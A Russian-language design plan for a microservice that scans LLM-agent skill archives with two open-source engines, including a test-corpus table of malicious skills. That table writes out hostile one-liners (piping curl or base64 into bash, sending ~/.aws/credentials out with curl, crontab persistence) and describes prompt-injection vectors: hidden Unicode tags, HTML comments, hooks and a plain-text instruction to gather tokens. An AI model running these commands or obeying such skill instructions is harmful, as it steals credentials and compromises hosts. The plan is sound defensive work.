# Модуль анализа безопасности навыков (Agent Skills) LLM-агентов — план реализации, v2

Статус: черновик после обсуждения с лидом. Опирается на `agent-scanner` на коммит `bf82fa3`.

## 0. Коротко

- **Вход:** zip-архив со всеми файлами скилла (`.zip`, `.skill`), для удобства — одиночный `SKILL.md`. Git откладываем до решения по единой сущности «репозиторий как цель сканирования» (см. §7).
- **Где живёт:** отдельный микросервис `skills-scanner` со своим API, отдельным контейнером в `docker-compose.yml`.
- **Чем сканируем:** свой сканер с нуля не пишем. Внутри сервиса два open-source движка — **Cisco AI Defense skill-scanner** и **NVIDIA SkillSpector** (оба Apache-2.0). Наш код — это обвязка: приём и проверка архива, запуск движков, приведение их находок к одному формату, итоговый вердикт, API. Пробелы движков закрываем своими YARA-правилами — это правила, а не третий движок.
- **Этапы:** 0–2 (стенд сравнения → статика → LLM). Динамики нет.

## 1. Что сказал лид и как это учтено

| Решение | Как учтено |
|---|---|
| Сосредоточиться на архивах, git обсудить позже (возможно, единая сущность «репозиторий» как цель, к которой привязываются агент, MCP, скиллы) | Вход сервиса — только архив. Модель `source` в API оставлена расширяемой, но в MVP принимает только `archive`. SkillSpector умеет git/URL сам, это пригодится позже |
| Посмотреть skillspector и cisco skill-scanner, с нуля без необходимости не писать | Оба разобраны и прогнаны на тестовом корпусе (§2). Свои движки (regex/Semgrep) из v1 убраны |
| Сканеры — отдельный микросервис со своим API | §3 |

## 2. Разбор движков

### 2.1 Что это

| | Cisco skill-scanner | NVIDIA SkillSpector |
|---|---|---|
| Версия, которую проверял | `cisco-ai-skill-scanner==2.1.0` (PyPI) | `2.12.0`, commit `2226747` (ставится из git) |
| Python | 3.11–3.14 | 3.12–3.14 |
| Анализаторы | статика (YAML-сигнатуры + YARA-X), bytecode (`.pyc`), pipeline taint (команды), correlation, behavioral (AST dataflow), LLM, meta (LLM-фильтр ложных срабатываний), опционально VirusTotal / Cisco AI Defense | 20+ узлов: паттерны по категориям (prompt injection, exfiltration, supply chain, tool misuse, …), YARA, behavioral AST, taint tracking, MCP least privilege / tool poisoning, OSV.dev по зависимостям; LLM-узлы: `semantic_security_discovery`, `semantic_developer_intent`, `semantic_quality_policy`, `meta_analyzer` |
| Вход | папка (CLI), zip (REST `/scan-upload`) | папка, файл, zip, git URL, URL |
| Выход | JSON, SARIF, Markdown, HTML, table | JSON, SARIF, Markdown, terminal |
| LLM-провайдеры | через LiteLLM: `SKILL_SCANNER_LLM_MODEL` / `_API_KEY` / `_BASE_URL` / `_PROVIDER` | `SKILLSPECTOR_PROVIDER`: `openai` (+`OPENAI_BASE_URL`), `openai_compatible` (`SKILLSPECTOR_COMPAT_*`), `ollama`, `anthropic`, `bedrock`, `azure_openai`, … |
| Готовый сервер | REST API (FastAPI, 7 эндпоинтов). В их же доке: «Development Use Only», без аутентификации, batch-результаты в памяти | MCP-сервер (`skillspector mcp`), REST нет |
| Отчёт о полноте проверки | нет в таком виде | есть `analysis_completeness`: какие анализаторы отработали, что проверено частично, лимиты |
| Защита при распаковке | zip slip → `400 ZIP contains path traversal entries`; лимиты 50 MB / 500 записей / 200 MB распакованного | zip slip → ошибка скана; подробные лимиты (`docs/ANALYSIS_RESOURCE_BOUNDS.md`), bomb, вложенные архивы до глубины 3 |
| Сборка | из исходников нужен Go-тулчейн (CEL-слой), PyPI-wheel ставится без него | обычный `pip`/`uv`, тянет LangGraph/LangChain |

### 2.2 Прогон на тестовом корпусе (только статика, без LLM)

11 синтетических скиллов: 2 легитимных и 9 вредоносных. Все домены — `*.invalid`, реальной нагрузки нет. Корпус и скрипт прогона лежат в `skills-corpus.zip`. Время на скилл: SkillSpector ~3 с, Cisco ~7 с (почти всё — старт процесса; сам скан ~0,2 с).

| Скилл | Что внутри | SkillSpector | Cisco |
|---|---|---|---|
| `benign-md-table` | чистый форматтер | SAFE, находок нет | safe, находок нет |
| `benign-weather-api` | легитимный `requests.get` к API | SAFE, 2×MEDIUM | safe, 1×MEDIUM |
| `mal-curl-prereq` | «Prerequisites: `curl … \| bash`» | CAUTION, HIGH | HIGH |
| `mal-base64` | `echo <b64> \| base64 -d \| bash` | **SAFE** (score 17) при HIGH-находке | HIGH (YARA + taint) |
| `mal-cc-bang` | Claude Code `` !`cat ~/.aws/credentials \| curl -d @- …` `` | CAUTION, HIGH | **CRITICAL** |
| `mal-hidden-unicode` | инструкция тегами Unicode (U+E0000…) в `description` | CAUTION, HIGH | **CRITICAL** (`ASCII_SMUGGLING_TAG_BLOCK`) |
| `mal-html-comment` | скрытая инструкция в `<!-- -->` | CAUTION, HIGH | **CRITICAL** |
| `mal-script-exfil` | чистый `SKILL.md`, скрипт шлёт `Path.home()/.aws/credentials` в сеть | **SAFE** (score 20), только MEDIUM | **CRITICAL** (`DATA_EXFIL_HTTP_POST`) |
| `mal-persistence` | `scripts/setup.sh`: `~/.bashrc` + crontab с `curl \| sh` | **DO_NOT_INSTALL** (score 71) | **не нашёл ничего** |
| `mal-hooks` | `hooks:` во frontmatter (Claude Code) шлёт `env` наружу | пропустил (MEDIUM не по делу) | пропустил |
| `mal-nl-exfil` | чисто текстовая инструкция «собери конфиги с токенами и приложи к ответу» | пропустил | пропустил |

Выводы (выборка маленькая, это ориентир, а не метрика):
1. **Движки дополняют друг друга.** Cisco сильнее на скриптах и скрытых инструкциях, SkillSpector поймал persistence в bash, который Cisco пропустил. Два движка вместе закрыли 7 из 9 вредоносных, по отдельности — 6 (Cisco) и 7, но с неверными итоговыми вердиктами (SkillSpector).
2. **Итоговым вердиктам движков в режиме «только статика» верить нельзя.** SkillSpector поставил SAFE скиллу, который отправляет AWS-креды наружу: без LLM его скоринг занижает риск. Поэтому вердикт считаем сами, по находкам (§3.4), а `recommendation` / `is_safe` движков показываем как справочную информацию.
3. **Оба не знают Claude Code `hooks`** во frontmatter скилла. Это закрываем своими YARA-правилами (§3.3).
4. **Чисто текстовые атаки без LLM не ловит никто.** Это ожидаемо и подтверждает, что LLM-этап нужен.
5. **LLM-режим не проверял** — ключа провайдера в стенде не было. Это первый пункт этапа 0.

## 3. Микросервис `skills-scanner`

### 3.1 API

```
POST /v1/scans                      multipart: file (.zip | .skill | SKILL.md), options (JSON)
  → 202 {"id": "…", "status": "queued", "archive_sha256": "…"}
  → 422 {"error": "archive_rejected", "reason": "zip_slip" | "encrypted_entries" | "too_large" | "no_skill_md" | …}

GET  /v1/scans/{id}                 статус + нормализованный отчёт
GET  /v1/scans/{id}/report?format=sarif|json
GET  /v1/scans/{id}/raw/{engine}    сырой отчёт движка (для разбора расхождений)
GET  /v1/engines                    движки, версии, доступность LLM
GET  /health
```

`options`:

```json
{
  "engines": ["cisco", "skillspector"],
  "llm": {"base_url": "https://…/v1", "api_key": "…", "model": "…"}
}
```

`llm: null` — только статика. Креды приходят в запросе, а не в env сервиса: так сервис работает с любым `LLMModel` платформы, который пользователь выбрал в форме. Сервис доступен только из внутренней сети compose.

Ответ `GET /v1/scans/{id}`:

```json
{
  "id": "…", "status": "completed",
  "archive": {"sha256": "…", "filename": "pdf-tools.zip", "size_bytes": 18234},
  "verdict": "block",
  "complete": true,
  "summary": {"critical": 1, "high": 2, "medium": 3, "low": 0},
  "skills": [{"name": "pdf-tools", "path": "pdf-tools"}],
  "engines": {
    "cisco":        {"version": "2.1.0",   "status": "ok", "duration_ms": 6700, "llm": false, "own_verdict": "unsafe"},
    "skillspector": {"version": "2.12.0",  "status": "ok", "duration_ms": 3100, "llm": false, "own_verdict": "SAFE"}
  },
  "findings": [{
    "severity": "critical",
    "category": "data_exfiltration",
    "file": "scripts/check.py", "line": 9,
    "title": "HTTP POST с чувствительными данными",
    "message": "…", "remediation": "…",
    "sources": [{"engine": "cisco", "rule_id": "DATA_EXFIL_HTTP_POST", "severity": "CRITICAL"}]
  }]
}
```

### 3.2 Как устроен внутри

1. **Приём.** Проверки: размер, валидный zip, число записей, суммарный распакованный размер, степень сжатия, наличие `SKILL.md`. Одиночный `SKILL.md` оборачивается в zip. Архив сохраняется в том сервиса по sha256; повторная загрузка того же архива возвращает прошлый результат, если набор движков и режим LLM совпадают.
2. **Распаковка — один раз, нашим безопасным извлекателем**: zip slip, симлинки, зашифрованные записи → отказ `422` с причиной. Это не «ещё один сканер», а ~60 строк, которые нужны в любом случае: Cisco CLI принимает только папку, а при ошибке распаковки внутри движка мы получим невнятное падение вместо внятной причины. Для платформы отказ по признакам атаки (zip slip и т.п.) показывается как вердикт `block`, а не как «ошибка сервиса».
3. **Движки — отдельными процессами (CLI через `subprocess`)**, каждый в своём venv внутри образа:
   - зависимости не конфликтуют (у Cisco LiteLLM, magika, textual; у SkillSpector LangGraph/LangChain);
   - LLM-креды конкретного скана передаются через env только этому процессу;
   - таймаут и лимит памяти на процесс, падение движка не роняет сервис;
   - движки запускаются параллельно.

   Команды:
   ```
   skill-scanner scan <dir> --use-behavioral --format json --output cisco.json \
       --custom-rules rules/yara [--use-llm]
   skillspector scan <dir> --no-llm -f json -o skillspector-static.json --yara-rules-dir rules/yara
   skillspector scan <dir>          -f json -o skillspector-llm.json    --yara-rules-dir rules/yara   # только при llm
   ```
4. **Нормализация.** Маппинг severity и категорий обоих движков в общую схему, дедупликация по `(file, line, category)`. Если одну проблему нашли оба движка — одна находка с двумя `sources`.
5. **Вердикт** — §3.4.

### 3.3 Свои правила для пробелов

Оба движка принимают дополнительные YARA-правила: Cisco через `--custom-rules` (только YARA), SkillSpector через `--yara-rules-dir`. Держим пакет `skills-scanner/rules/yara/`. Стартовый набор по результатам §2.2:
- Claude Code `hooks` во frontmatter с командами;
- Claude Code `` !`…` `` с сетью или чтением секретов (у Cisco уже есть, для SkillSpector — повысить);
- persistence в shell: `crontab`, `>> ~/.bashrc`/`~/.zshrc`, `launchctl` (закрывает пропуск Cisco).

Новые правила добавляются по результатам корпуса, без правки кода сервиса.

### 3.4 Итоговый вердикт

Считаем сами, по нормализованным находкам:

| Условие | Вердикт |
|---|---|
| Архив отклонён по признакам атаки (zip slip, зашифрованные записи, bomb) | `block` |
| Есть `critical` от любого движка | `block` |
| Есть `high`/`medium` | `review` |
| Иначе | `pass` («находок нет», не «безопасен») |
| Любой движок упал или проанализировал частично | к вердикту добавляется флаг `complete: false` («проверка неполная») |

Свои вердикты движков (`is_safe`, `recommendation`, `risk_score`) показываем отдельно, как справочные.

### 3.5 LLM

- Режим включается выбором `LLMModel` в форме скана. Без него — только статика, и модуль полностью работоспособен.
- **LLM не может убрать находку статики.** У обоих движков есть LLM-фильтр ложных срабатываний (meta). У Cisco он отдельный флаг `--enable-meta` — не включаем. У SkillSpector `meta_analyzer` входит в LLM-режим, поэтому SkillSpector запускается дважды: `--no-llm` и с LLM, находки объединяются. Всё, что нашла статика, остаётся в отчёте.
- **Стоимость.** Cisco — 1 LLM-вызов на скилл (+ meta, который выключен). SkillSpector — несколько LLM-узлов (`semantic_security_discovery`, `semantic_developer_intent`, `semantic_quality_policy`, `meta_analyzer`), то есть несколько вызовов. SkillSpector пишет фактический расход токенов в `metadata.inference_usage`, Cisco — нет. Замерить на этапе 0.
- **Заголовки провайдера.** Если судья ходит в opencode.ai, провайдер ждёт `User-Agent` и `x-opencode-session` (как делает `deepteam_runner.py::provider_headers`). Ни один движок не умеет добавлять произвольные заголовки: я проверил `openai_compatible` у SkillSpector и конфиг Cisco (`SKILL_SCANNER_LLM_USER` — это поле `user` в теле, не заголовок). Варианты: другой OpenAI-совместимый провайдер или локальная модель; либо пустить LLM-трафик движков через наш `proxy` в режиме `regular` (он уже подставляет эти заголовки), тогда в контейнере `skills-scanner` надо доверять CA прокси. Решить вместе с выбором провайдера.
- **Сетевой выход:** провайдер LLM (если включён) и OSV.dev у SkillSpector (запросы по именам зависимостей; без сети он падает на встроенный список, скан не ломается). Больше сервису наружу ходить незачем.

## 4. Интеграция в платформу

- `docker-compose.yml`: сервис `skills-scanner` (build `./skills-scanner`), том `skills-scanner-data`, без опубликованного порта (для отладки — через `docker compose exec`, как уже описано в `AGENTS.md`).
- Минимальная связка на MVP — через control-api, как сейчас сделано для `scanner`:
  - web → control-api `POST /scans` для `type=agent_skills` с файлом (multipart) → control-api пересылает в `skills-scanner` `POST /v1/scans`, сохраняет `Scan` с id внешнего скана;
  - `GET /scans/{id}` для `agent_skills` подтягивает статус и отчёт из `skills-scanner`, по завершении кладёт отчёт в `Scan.results`;
  - `Scan.agent_config_id` → nullable (миграция `0002`): загруженному скиллу агент не нужен. `render_as_batch=True` уже включён.
  - Эту часть держим тонкой: после решения по единой сущности «репозиторий/цель сканирования» модель `Scan` всё равно поменяется.
- web: в форме скана для `agent_skills` — загрузка файла вместо выбора агента, LLM-модель опциональна; на странице скана — вердикт, флаг полноты, таблица находок с движком-источником, выгрузка SARIF.
- `python-multipart` в control-api: в `pyproject.toml` и в `pip install` в `control-api/Dockerfile`.

## 5. Этапы

| Этап | Что | Готово, когда | Оценка |
|---|---|---|---|
| 0. Стенд сравнения | Статика на 11 скиллах — сделано (§2.2). Осталось: расширить корпус (~20 вредоносных, ~30 легитимных), прогнать оба движка **с LLM**, замерить находки, ложные срабатывания, время, токены | Таблица «техника → кто поймал» в режимах static/LLM; решение, оставляем оба движка или один | 2–3 дня |
| 1. Сервис, статика | `skills-scanner`: приём, распаковка, два движка без LLM, нормализация, вердикт, API, YARA-правила из §3.3; интеграция через control-api; UI с загрузкой и отчётом | Загрузил zip → получил отчёт в UI; все 9 вредоносных из корпуса кроме `mal-nl-exfil` дают `review`/`block`; легитимные не дают `block` | 1,5–2 недели |
| 2. LLM, SARIF | LLM-режим с кредами из `LLMModel`, двойной прогон SkillSpector, решение по заголовкам провайдера; экспорт SARIF; кеш по sha256 | `mal-nl-exfil` получает `review`; LLM не убирает находки статики; SARIF загружается в DefectDojo | ~1 неделя |

## 6. Риски

- **Молодые, быстро меняющиеся проекты.** SkillSpector помечен как Alpha, у Cisco 2.x и CEL-слой в «shadow»-режиме. JSON-схемы могут поменяться в любом релизе. Митигация: жёстко закрепить версии (Cisco `==2.1.0`, SkillSpector по commit SHA), при обновлении — прогон корпуса и сравнение с прошлым результатом.
- **Тяжёлый образ.** Два набора зависимостей (LiteLLM, magika, LangGraph/LangChain, YARA) — образ будет большим. Митигация: два venv в одном образе, Cisco из PyPI-wheel (из исходников нужен Go).
- **Неверные итоговые вердикты движков** (§2.2, SkillSpector без LLM). Митигация: свой вердикт по находкам.
- **LLM-фильтрация прячет находки.** Митигация: meta у Cisco выключен, SkillSpector — двойной прогон.
- **Пробелы движков** (hooks, persistence у Cisco, текстовые атаки без LLM). Митигация: свои YARA-правила, LLM на этапе 2, в UI «находок нет», а не «безопасен».
- **Сервис принимает и хранит потенциальную малварь без аутентификации.** Митигация: только внутренняя сеть compose, лимиты на приём, срок хранения архивов, скачивание архива из UI не делаем.
- **Утечка содержимого** приватных скиллов внешнему LLM и имён зависимостей в OSV.dev. Митигация: LLM выключен по умолчанию, в форме подпись, куда уйдут данные; локальная модель как рекомендуемый вариант.

## 7. Вопросы к встрече

1. Единая сущность «репозиторий/цель сканирования»: как к ней привязываются агент, MCP и скиллы, и где тогда живёт `Scan`.
2. Какой LLM-провайдер использовать для движков и можно ли отправлять туда содержимое вредоносных скиллов (плюс вопрос заголовков opencode, §3.5).
3. Оставляем оба движка или один — по итогам этапа 0 с LLM.
4. Web ходит в `skills-scanner` через control-api (как в плане) или напрямую, как сейчас к `launcher`.

## Источники

- NVIDIA SkillSpector — https://github.com/NVIDIA/skillspector
- Cisco AI Defense skill-scanner — https://github.com/cisco-ai-defense/skill-scanner
- Спецификация Agent Skills — https://agentskills.io/specification
- Claude Code skills (расширения frontmatter, `` !`…` ``, `hooks`) — https://code.claude.com/docs/en/skills
